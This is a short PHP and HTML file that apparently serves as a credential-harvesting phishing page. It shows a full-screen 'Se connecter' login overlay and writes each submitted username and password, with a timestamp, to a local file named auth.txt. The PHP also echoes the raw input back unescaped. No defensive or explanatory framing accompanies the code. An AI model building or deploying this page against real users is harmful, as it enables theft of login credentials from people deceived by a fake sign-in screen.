<?php
if(isset($_GET["username"]) && isset($_GET["password"])){
    echo $_GET["username"];
    echo "<br>";
    echo $_GET["password"];

    $myfile = fopen("auth.txt", "w");
    fwrite($myfile, date("y/m/d H:i:s")." login:".$_GET["username"]." password:".$_GET["password"]);
    fclose($myfile);
}
?>

// run: php -S 127.0.0.1:8080
<style>
	body{overflow:hidden;}
</style>

<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:#e7e7e7;color:black;padding-left:40%;padding-top:200px">
<h1>Se connecter</h1>
<form action="http://127.0.0.1:8080/index.php" method="GET">
<p>
<label> Username: <input type="text" name="username"></label>
</p>
<p>
<label> Password: <input type="password" name="password"></label>
</p>
<p>
<input type="submit" value="Se connecter">
</p>
</form>